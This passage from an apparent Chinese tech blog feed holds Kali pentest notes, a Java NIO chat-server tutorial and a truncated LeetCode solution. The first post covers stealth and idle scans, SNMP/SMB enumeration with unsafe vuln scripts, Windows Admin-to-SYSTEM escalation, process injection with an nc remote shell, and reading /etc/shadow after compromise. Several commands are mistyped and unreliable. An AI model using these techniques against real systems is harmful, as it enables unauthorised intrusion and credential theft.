shell"><table><tr><td class="code"><pre><span class="line">nmap 1.1.1.1-254 -PU53 -sn 使用udp发现</span><br><span class="line">nmap 1.1.1.1-254 -PA80 -sn 使用TCP发现（ack包 ）</span><br><span class="line">nmap -iL iplist.txt -PA80 -sn</span><br><span class="line"></span><br><span class="line">端口扫描：</span><br><span class="line">Nmap</span><br><span class="line">nmap -sU 1.1.1.1 默认的1000个参数</span><br><span class="line">		ICMP host-unreachable说明端口关闭</span><br><span class="line">		没有回应说明可能开启</span><br><span class="line">nmap 1.1.1.1 -sU-p 53</span><br><span class="line">nmap -iL iplist.txt -sU P 1-200</span><br></pre></td></tr></table></figure><blockquote><p>所有的TCP扫描都是基于三次握手的变化来判断目标端口的状态</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">隐蔽扫描：</span><br><span class="line">	即每次不建立完整三次连接，只发生syn信息</span><br><span class="line">	应用日志不记录扫描行为，较为隐蔽</span><br><span class="line">	发送流程为：--&gt;使用scapy发送Syn包给目标主机</span><br><span class="line">    		  &lt;--目标主机回复syn/ack包</span><br><span class="line">    		  --&gt;本机操作系统内核会识别到异常握手，发出RST请求</span><br><span class="line">    屏蔽内核的RST请求：</span><br><span class="line">    iptables -A OUTPUT -P tcp --tcp-flags RST RST -d 本地ip -j DROP</span><br><span class="line"></span><br><span class="line">	Scapy命令：</span><br><span class="line">sr1(IP(dst="192.168.60.3]/TCP(dport=80),timneout=l,verbose=1)</span><br><span class="line">	</span><br><span class="line">	nmap命令：</span><br><span class="line">	nmap -sS 1.1.1.1 -p 80 21,25.110.443</span><br><span class="line">	nmap -sS 1.1.1.1 -P -65535 --open</span><br><span class="line">	nmap -sS 1.1.1.1 -P  --open</span><br><span class="line">	nmap -sS -iL iplist.txt -P 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">僵尸扫描</span><br><span class="line">	极度隐蔽</span><br><span class="line">	实施条件苛刻</span><br><span class="line">	可伪造源地址</span><br><span class="line">	选择僵尸机：闲置系统且系统使用递增的IPID，不能全是0</span><br><span class="line">发现僵尸机： </span><br><span class="line">nmap -P 80 192.168.1.133 --script=ipidseq.nse</span><br><span class="line">扫描目标：</span><br><span class="line">nmap 172.16.36.135 -sl 172.16.36.134 Pn p 0- 100</span><br></pre></td></tr></table></figure><h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><blockquote><p>SNMP:<br>简单网络管理协议<br>Community strings<br>信息查询或重新配置<br>识别和绕过防火墙筛选</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">扫描banner：</span><br><span class="line">nc -nv x.x.x.x</span><br><span class="line"></span><br><span class="line">dmitry -p 172. 16.36.135</span><br><span class="line">dmitry -pb 172.16.36.135</span><br><span class="line"></span><br><span class="line">nmap -sI 1.1.1.1 -P 22 -script=banner </span><br><span class="line">nmap 域名/IP            （最强大）</span><br></pre></td></tr></table></figure><h4 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h4><blockquote><p>用处不大，现在的服务器会限制特定ip访问snmp</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snmp:</span><br><span class="line">	信息的金矿</span><br><span class="line">	经常被错误配置</span><br><span class="line">	public / private / manager</span><br><span class="line">MIB Tree:</span><br><span class="line">	SNMP Management Information Base (MIB)</span><br><span class="line">	树形的网络设备管理功能数据库</span><br><span class="line">	1.3.6.1.4.1.77.1.2.25</span><br><span class="line">onesixtyone 1.1.1.1 public</span><br><span class="line">onesixtyone -C dict.txt -i hosts -o my.log -W 100</span><br><span class="line">可读性强的工具：</span><br><span class="line">snmpcheck -t 192. 168.20.199</span><br><span class="line">snmpcheck -t 192. 168.20.199 -C private -V 2</span><br><span class="line">snmpcheck -t 192. 168.20.199 -W</span><br></pre></td></tr></table></figure><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h4><blockquote><p><code>Server Message Block</code> 协议是微软历史上出现安全问题最多的协议，实现复杂，默认开放，文件共享</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -v -p 139,445 192.168.60.1-20</span><br><span class="line">nmap 192.168.60.4 -p 139,445 --script=smb-os- discovery.nse</span><br><span class="line">nmap -v -P 139,445 --script=smb-check-vulns --script-args=unsafe=1 1.1.1.1</span><br><span class="line">nbtscan -r 192. 168.60.0/24</span><br><span class="line">enum4linux -a 192.1 68.60.10</span><br></pre></td></tr></table></figure><h4 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h4><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">WEB应用防火墙</span></span><br><span class="line"><span class="attr">wafw00f</span> <span class="string">-l</span></span><br><span class="line"><span class="attr">wafw00f</span> <span class="string">http://www.microsoft.com</span></span><br><span class="line"><span class="attr">nmap</span> <span class="string">www.microsoft.com --script=http-waf-detect.nse</span></span><br></pre></td></tr></table></figure><h3 id="弱点-漏洞-扫描"><a href="#弱点-漏洞-扫描" class="headerlink" title="弱点(漏洞)扫描"></a>弱点(漏洞)扫描</h3><blockquote><p>kali集成了漏洞利用工具，使用searchsploit，我们可以搜索软件当前存在的漏洞及其攻击代码。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200611094925425.png" alt="image-20200611094925425"></p><blockquote><p>此外，NEXPOSE也是一款面向企业的强大的漏洞扫描工具，可以对web页面、操作系统进行登录扫描或黑盒扫描。NEXPOSE会将扫描到的漏洞按CVSS评级进行打分，并且可以生产报告。</p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><blockquote><p>Admin提权为System</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Windows system账号</span><br><span class="line">官方工具：</span><br><span class="line">	SysInternal suite</span><br><span class="line">	https://technet.microsoft.com/en-us/sysinternals/bb545027</span><br><span class="line">	psexec -i -S d taskmgr</span><br><span class="line"></span><br><span class="line">xp系统下：</span><br><span class="line">	at 19:39 /interactive cmd 该命令会定时启动一个system权限的cmd</span><br><span class="line">								（只能在xp系统使用）</span><br><span class="line">通过服务方式：</span><br><span class="line">	SC Create syscmd binPath= "cmd /K start" type= own type= interact</span><br><span class="line">	SC start syscmd</span><br><span class="line">	</span><br><span class="line">隐蔽注入：</span><br><span class="line">	上面的几种方式会创建单独的进程，可能被发现，可以使用pinjector进行隐蔽注入，注入到某个system权限的进程中，然后通过nc可以远程shell</span><br></pre></td></tr></table></figure><h4 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows：</span><br><span class="line">	Wireshark</span><br><span class="line">	Omnipeek</span><br><span class="line">	commview</span><br><span class="line">	Sniffpass</span><br><span class="line">Linux：</span><br><span class="line">	Tcpdump</span><br><span class="line">	Wireshark</span><br><span class="line">	Dsniff</span><br></pre></td></tr></table></figure><h4 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h4><blockquote><p>当我们获取到某个主机的root权限后，我们要尽可能收集其信息</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Linux:</span><br><span class="line">    /etc/resolv.conf   dns配置信息</span><br><span class="line">    /etc/passwd   存放用户账户</span><br><span class="line">    /etc/shadow	   存放用户密码</span><br><span class="line">    whoami, who -a</span><br><span class="line">    ifconfig -a, iptables -L -n, netstat -rn</span><br><span class="line">    uname -a, ps aux 查看操作系统信息，进程信息</span><br><span class="line">    dpkg -l | head  查看安装的软件</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Netty编程之NIO实践</title>
    <url>/2020/03/17/Netty%E7%BC%96%E7%A8%8B%E4%B9%8BNIO%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><blockquote><p>最近在学习Netty，其核心便是基于Java的NIO编程封装而来，这篇文章对NIO编程的原理进行介绍，并提供一个NIO编程的完整实践案例。</p></blockquote><a id="more"></a><h3 id="什么是Netty"><a href="#什么是Netty" class="headerlink" title="什么是Netty?"></a>什么是Netty?</h3><blockquote><p>Netty的特点总结如下：</p></blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9OZXR0eS8xMDA2MTYyND9mcj1hbGFkZGlu">Netty<i class="fa fa-external-link-alt"></i></span>是由JBOSS提供的一个Java开源框架，现在为Github上的独立开发项目。</li><li>Netty是一个异步的、基于事件驱动的网络应用框架，用以快速开发高性能、高可靠性的网络IO程序。</li><li>Netty主要针对在TCP协议下，面向Clients端的高并发应用，或者<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGluc2Fuc2h1L3AvNTU0Njk0OC5odG1s">Peer-to-Peer<i class="fa fa-external-link-alt"></i></span>场景下的大量数据持续传输的应用。</li><li>Netty的本质是一个NIO框架，用于服务器通信。</li></ul><hr><h3 id="Java网络编程三兄弟：BIO、NIO、NIO2-AIO"><a href="#Java网络编程三兄弟：BIO、NIO、NIO2-AIO" class="headerlink" title="Java网络编程三兄弟：BIO、NIO、NIO2(AIO)"></a>Java网络编程三兄弟：BIO、NIO、NIO2(AIO)</h3><hr><blockquote><p>显然NIO是Netty的灵魂，由于NIO属于Java三大I/O模型之一，要学习它不如把这三者合在一起先做个了解。</p></blockquote><table><thead><tr><th>I/O模型</th><th align="center">类型</th><th>描述</th></tr></thead><tbody><tr><td>Java BIO</td><td align="center">同步阻塞（传统阻塞型）</td><td>服务器实现模式为<strong>一个连接绑定一个线程</strong>即客户端有一个连接，当有客户端请求时，就需要启动一个线程进行处理。如果这个连接不做任何事情则造不必要的线程开销。</td></tr><tr><td>Java NIO</td><td align="center">同步非阻塞</td><td>服务器实现模式为<strong>一个线程处理多个请求</strong>，即客户端发送的请求会注册到多路复用器上，多路复用器可以轮询存在的I/O请求进行处理。</td></tr><tr><td>Java AIO</td><td align="center">异步非阻塞</td><td>AIO引入异步通道的概念，采用Proactor模式，简化了程序的编写，有效的请求才启动线程，它的特点是先由操作系统完成后才通知服务端程序启动线程去处理，一般适用于连接数较多且连接时间较长的应用。</td></tr></tbody></table><hr><h3 id="NIO核心原理"><a href="#NIO核心原理" class="headerlink" title="NIO核心原理"></a>NIO核心原理</h3><p><code>NIO</code>由三大核心部分组成：</p><ul><li><code>Channel</code>：通道。</li><li><code>Buffer</code>：缓冲区。</li><li><code>Selector</code>：选择器。</li></ul><p>原理说明：</p><hr><blockquote><ul><li>每个<code>Channel</code>对应一个<code>Buffer</code>。</li><li><code>Selector</code>对应一个线程，一个线程对应多个<code>Channel</code>。</li><li>多个<code>Channel</code>可以注册到一个<code>Selector。</code></li><li>程序切换Channel由事件决定。</li><li><code>Selector</code>会根据不同事件，在各个<code>Channel</code>切换。</li><li>数据的读取或者写入通过<code>Buffer</code>，是双向的，但需要<code>flip()</code>切换读/写模式。</li><li><code>Channel</code>是双向的，可以返回底层操作系统的情况（比如<code>Linux</code>底层是双向的）。</li></ul></blockquote><hr><p><strong>NIO模式示意图如下：</strong><br><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/NIO.png" alt="NIO示例图" style="zoom:80%"></p><hr><h4 id="关于Channel"><a href="#关于Channel" class="headerlink" title="关于Channel"></a>关于Channel</h4><blockquote><p>基本介绍:</p></blockquote><ol><li><code>BIO</code>中的<code>stream</code>是单向的，例如<code>FileInputStream</code> 对象只能进行读取数据的操作，而NIO中的通道(<code>Channel</code>)是双向的，可以读操作，也可以写操作。</li><li><code>Channel</code>在<code>NIO</code>中是一 个接口：<font color="green"><strong>public interface Channel extends Closeable{}</strong></font>。</li><li>常用的<code>Channel</code>类有: <code>FileChannel</code>、<code>DatagramChannel</code>、<code>ServerSocketChannel</code> 和<code>SocketChannel</code>。<font color="green"><strong><code>ServerSocketChannel</code>类似<code>ServerSocket</code>，<code>SocketChannel</code>类似<code>Socket</code></strong></font></li><li><code>FileChannel</code> 用于文件的数据读写，<code>DatagramChannel</code>用于<code>UDP</code>的数据读写，<code>ServerSocketChannel</code>和<code>SocketChannel</code>用于<code>TCP</code>的数据读写。</li></ol><hr><h4 id="关于Buffer"><a href="#关于Buffer" class="headerlink" title="关于Buffer"></a>关于Buffer</h4><blockquote><p>Java的基本数据类型（除了boolean）均有一个Buffer类与之对应，最常用的自然是<code>ByteBuffer</code>类，该类的主要方法如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ByteBuffer</span></span>&#123;</span><br><span class="line">        <span class="comment">//缓冲区创建相关api</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">llocateDirect</span><span class="params">(<span class="keyword">int</span> capacty)</span><span class="comment">//创建直接缓冲区</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">llocate</span><span class="params">(<span class="keyword">int</span> capacty)</span><span class="comment">//设置缓冲区的初始容量</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">wrap</span><span class="params">(<span class="keyword">byte</span>[] array)</span><span class="comment">//把个数组放到缓冲区中使用</span></span></span><br><span class="line"><span class="function">        <span class="comment">//构造初始化位置ofset和上界length的缓冲区</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">wrap</span><span class="params">(<span class="keyword">byte</span>[] array,<span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function">        <span class="comment">//缓存区存取相关API</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">byte</span> <span class="title">get</span><span class="params">( )</span><span class="comment">//从当前位置position上get, get之后， position会自动+1</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">byte</span> <span class="title">get</span> <span class="params">(<span class="keyword">int</span> index)</span></span>;<span class="comment">//从绝对位置get</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> ByteBuffer <span class="title">put</span> <span class="params">(<span class="keyword">byte</span> b)</span>:<span class="comment">//从当前位置上添加，put之后，position会自动+1</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">abstract</span> ByteBuffer <span class="title">put</span> <span class="params">(<span class="keyword">int</span> index, <span class="keyword">byte</span> b)</span></span>;<span class="comment">//从绝对位置上put</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="关于Selector"><a href="#关于Selector" class="headerlink" title="关于Selector"></a>关于Selector</h4><blockquote><p>Selector类是一个抽象类，常用的方法如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Selector</span> <span class="keyword">implements</span> <span class="title">Closeable</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Selector <span class="title">open</span><span class="params">()</span></span>;<span class="comment">//得到一个选择器对象</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">long</span> timeout)</span></span>;<span class="comment">//监控所有注册的通道，当其中有10操作可以进行时，将对应的										//SelectionKey加入到内部集合中并返回，参数用来设置超时时间</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Set&lt;SelectionKey&gt; <span class="title">selectedKeys</span><span class="params">()</span></span>;<span class="comment">// 从内部集合中得到所有的SelectionKey</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NIO编程流程"><a href="#NIO编程流程" class="headerlink" title="NIO编程流程"></a>NIO编程流程</h3><div class="note success"><ol><li>当客户端需要连接时，通过<code>ServerSocketChannel</code>得到<code>SocketChannel</code>对象。</li><li>将该<code>SocketChannel</code>对象注册到<code>Selector</code>上，使用<code>register(Selector sel)</code>方法，在一个<code>selector</code>上可以注册多个<code>SocketChannel</code>对象。（<strong>将监听服务通道和监听到的对象通道均注册到Selector</strong>）</li><li>注册后返回一个<code>SelectionKey</code>，会和该<code>Selector</code>关联（集合）。</li><li><code>Selector</code>进行监听<code>select</code>方法，返回有事件发生的通道个数。</li><li>进一步得到各个<code>SelectionKey</code>。</li><li>通过使用<code>SelectionKey</code>的<code>channel()</code>方法反向获取<code>SocketChannel</code>。</li><li>通过得到的<code>channel</code>完成业务处理。</li></ol></div><hr><h3 id="NIO代码实践—简单的多用户聊天服务场景"><a href="#NIO代码实践—简单的多用户聊天服务场景" class="headerlink" title="NIO代码实践—简单的多用户聊天服务场景"></a>NIO代码实践—简单的多用户聊天服务场景</h3><h4 id="服务端：NIOServer"><a href="#服务端：NIOServer" class="headerlink" title="服务端：NIOServer"></a>服务端：NIOServer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.nio;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2020/3/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NIOServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//创建ServerSocketChannel</span></span><br><span class="line">        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到一个selector对象</span></span><br><span class="line">        Selector selector = Selector.open();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//绑定一个端口6666，在服务器端监听</span></span><br><span class="line">        serverSocketChannel.socket().bind(<span class="keyword">new</span> InetSocketAddress(<span class="number">6666</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置为非阻塞</span></span><br><span class="line">        serverSocketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把serverSocketChannel注册到selector，关心的实践为OP_ACCEPT</span></span><br><span class="line">        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//循环等待客户端连接</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="comment">//等待1秒，如果没有事件发生，继续</span></span><br><span class="line">            <span class="keyword">if</span>(selector.select(<span class="number">1000</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//没有事件发生</span></span><br><span class="line">                System.out.println(<span class="string">"服务器等待了1秒，无连接"</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果返回的&gt;0,就获取到相关的SelectionKey集合</span></span><br><span class="line">            <span class="comment">//selectionKeys是关注事件的集合</span></span><br><span class="line">            <span class="comment">//通过selectionKeys反向获取通道</span></span><br><span class="line">            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">            <span class="comment">//遍历selectionKeys，使用迭代器！！</span></span><br><span class="line">            Iterator&lt;SelectionKey&gt; keyIterator = selectionKeys.iterator();</span><br><span class="line">            <span class="keyword">while</span> (keyIterator.hasNext())&#123;</span><br><span class="line">                <span class="comment">//获取到SelectionKey</span></span><br><span class="line">                SelectionKey key = keyIterator.next();</span><br><span class="line">                <span class="comment">//根据key对应通道发生的事件做相应的处理</span></span><br><span class="line">                <span class="keyword">if</span>(key.isAcceptable())&#123;</span><br><span class="line">                    <span class="comment">//有新的客户端连接</span></span><br><span class="line">                    <span class="comment">//给该客户端生成一个SocketChannel</span></span><br><span class="line">                    <span class="comment">//注意：这里已经知道实际的类型，所以下面的accept()方法</span></span><br><span class="line">                    <span class="comment">//并不会阻塞</span></span><br><span class="line">                    SocketChannel socketChannel = serverSocketChannel.accept();</span><br><span class="line">                    System.out.println(<span class="string">"客户端连接成功，生成了一个通道 "</span>+</span><br><span class="line">                            socketChannel.hashCode());</span><br><span class="line">                    <span class="comment">//将通道设置为非阻塞</span></span><br><span class="line">                    socketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">                    <span class="comment">//将当前的socketChannel注册到selector，关注事件为</span></span><br><span class="line">                    <span class="comment">//OP_READ(从通道读入到缓冲区)，同时给该socketChannel关联一个buffer</span></span><br><span class="line">                    socketChannel.register(selector,SelectionKey.OP_READ,</span><br><span class="line">                            ByteBuffer.allocate(<span class="number">1024</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(key.isReadable())&#123;</span><br><span class="line">                    <span class="comment">//发生一个OP_READ事件</span></span><br><span class="line">                    <span class="comment">//通过key,反向获取对应的通道</span></span><br><span class="line">                    <span class="comment">//SelectableChannel向下转型为SocketChannel</span></span><br><span class="line">                    SocketChannel channel = (SocketChannel) key.channel();</span><br><span class="line">                    <span class="comment">//获取到该通道关联的buffer</span></span><br><span class="line">                    ByteBuffer buffer = (ByteBuffer)key.attachment();</span><br><span class="line">                    channel.read(buffer);</span><br><span class="line">                    System.out.println(<span class="string">"From 客户端："</span>+<span class="keyword">new</span> String(buffer.array()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//手动从集合中移除SelectionKey，防止重复操作</span></span><br><span class="line">                keyIterator.remove();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端：NIOClient"><a href="#客户端：NIOClient" class="headerlink" title="客户端：NIOClient"></a>客户端：NIOClient</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.nio;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2020/3/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NIOClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//得到一个网络通道</span></span><br><span class="line">        SocketChannel socketChannel = SocketChannel.open();</span><br><span class="line">        <span class="comment">//设置非阻塞模式</span></span><br><span class="line">        socketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">        <span class="comment">//提供服务器端的IP和端口</span></span><br><span class="line">        InetSocketAddress inetSocketAddress = <span class="keyword">new</span> InetSocketAddress(<span class="string">"127.0.0.1"</span>, <span class="number">6666</span>);</span><br><span class="line">        <span class="comment">//连接服务器</span></span><br><span class="line">        <span class="comment">//其中socketChannel.connect判断远程连接是否建立成功</span></span><br><span class="line">        <span class="comment">//socketChannel.finishConnect()判断channel's socket是否连接</span></span><br><span class="line">        <span class="keyword">if</span>(!socketChannel.connect(inetSocketAddress))&#123;</span><br><span class="line">            <span class="keyword">while</span> (!socketChannel.finishConnect())&#123;</span><br><span class="line">                System.out.println(<span class="string">"因为连接需要时间，客户端不会阻塞，可以继续工作"</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果连接成功则发生数据</span></span><br><span class="line">        String str = <span class="string">"hello ,小yi"</span>;</span><br><span class="line">        <span class="comment">//wrap()包裹的含义，返回一个与str大小相等的buffer</span></span><br><span class="line">        <span class="comment">//等价于ByteBuffer buffer = ByteBuffer.allocate(str.getBytes().length);</span></span><br><span class="line">        ByteBuffer buffer = ByteBuffer.wrap(str.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//发生数据，将buffer写入通道</span></span><br><span class="line">        socketChannel.write(buffer);</span><br><span class="line">        <span class="comment">//客户端停在此处</span></span><br><span class="line">        System.in.read();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note warning"><p>启动<code>NIOServer</code>和多个<code>NIOClient</code>，可以看到打印的<code>hashcode</code>值不相等，说明一个<code>Selector</code>同时管理着多个连接。</p></div>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>NIO</tag>
        <tag>网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title>33. 搜索旋转排序数组</title>
    <url>/2020/03/10/33-%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><div class="note primary"><p>假设按照升序排序的数组在预先未知的某个点上进行了旋转。( 例如，数组 <code>[0,1,2,4,5,6,7]</code> 可能变为 <code>[4,5,6,7,0,1,2]</code> )。搜索一个给定的目标值，如果数组中存在这个目标值，则返回它的索引，否则返回 <code>-1</code> 。你可以假设数组中不存在重复的元素。你的算法时间复杂度必须是 <code>O(log n)</code> 级别。</p></div><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="note success"><p>该题有两个关键点：</p><ol><li>如何理解旋转：题中的旋转是在一个<strong>点</strong>旋转，所以对于数组如<code>[1,2,3]</code>，不存在类似这样的旋转结果：<code>[3,2,1]</code></li><li>要求时间复杂度为 <code>O(logn)</code>，很容易想到应该用二分法，但关键在于如何讨论出所有可能情况。</li></ol></div><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//二分查找:分三种情况，左边有序，右边有序，左右都有序</span></span><br><span class="line">        <span class="comment">//使用位运算代替乘除法（常用的优化办法）</span></span><br><span class="line">        <span class="keyword">int</span> len = nums.length;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = len-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(len == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> mid;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            mid = (left+right)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[left]&lt;=nums[mid]&amp;&amp;nums[mid]&lt;=nums[right])&#123;<span class="comment">//左右都有序</span></span><br><span class="line">                <span class="keyword">if</span>(target&gt;nums[mid])</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[left]&lt;=nums[mid]&amp;&amp;nums[mid]&gt;=nums[right])&#123;<span class="comment">//左边有序，右边无序</span></span><br><span class="line">                <span class="keyword">if</span>(target&gt;nums[mid])</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(target&lt;nums[mid]&amp;&amp;target&lt;nums[left])</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[left]&gt;=nums[mid]&amp;&amp;nums[mid]&lt;=nums[right])&#123;<span class="comment">//左边无序，右边有序</span></span><br><span class="line">                <span class="keyword">if</span>(target&lt;nums[mid])</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(target&gt;nums[mid]&amp;&amp;target&gt;nums[right])</span><br><span class="line">                    right = mid - <span 